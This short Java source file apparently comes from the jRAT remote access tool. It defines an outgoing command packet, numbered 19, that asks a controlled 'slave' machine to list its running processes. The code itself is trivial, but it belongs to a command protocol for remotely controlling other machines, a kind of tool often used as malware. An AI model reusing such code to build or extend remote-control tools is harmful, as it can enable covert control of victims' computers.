package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet19ListProcesses extends AbstractOutgoingPacket {
	
	private boolean icons;
	
	public Packet19ListProcesses() {
		this(false);
	}
	
	public Packet19ListProcesses(boolean icons) {
		this.icons = icons;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(icons);
	}

	@Override
	public short getPacketId() {
		return 19;
	}

}
